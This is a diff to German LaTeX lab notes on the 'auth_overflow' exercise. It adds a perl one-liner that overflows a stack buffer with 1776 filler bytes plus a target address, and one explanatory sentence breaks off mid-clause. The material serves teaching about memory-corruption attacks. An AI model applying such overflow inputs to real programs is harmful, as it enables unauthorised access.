@@ -28,7 +28,10 @@ Der Angriff ist ist im GDB nachvollziehbar. In diesem ist es möglich, Breakpoin
 \section{authentication overflow 2}
 Wie auch bei \autoref{sec:auth_overflow1} wird ein Buffer-Overflow auf dem Stack provoziert. Diesmal wird aber nicht der Return-Wert überschrieben, sondern die Das lässt sich mit dem folgenden Befehl durchführen:\\
 \begin{center}
-    (Befehl)
+	\texttt{
+		./auth\_overflow \$(perl -e 'print \dq A\dq x1776 . 
+		"\textbackslash x6d\textbackslash x53\textbackslash x55\textbackslash x55\textbackslash x55\textbackslash x55\textbackslash x00\textbackslash x00"')
+	}
 \end{center}
 \includegraphics[width=\textwidth]{img/fingeruebungen/disass_main_2.png}
 \includegraphics[width=\textwidth]{img/fingeruebungen/success_stack_2.png}
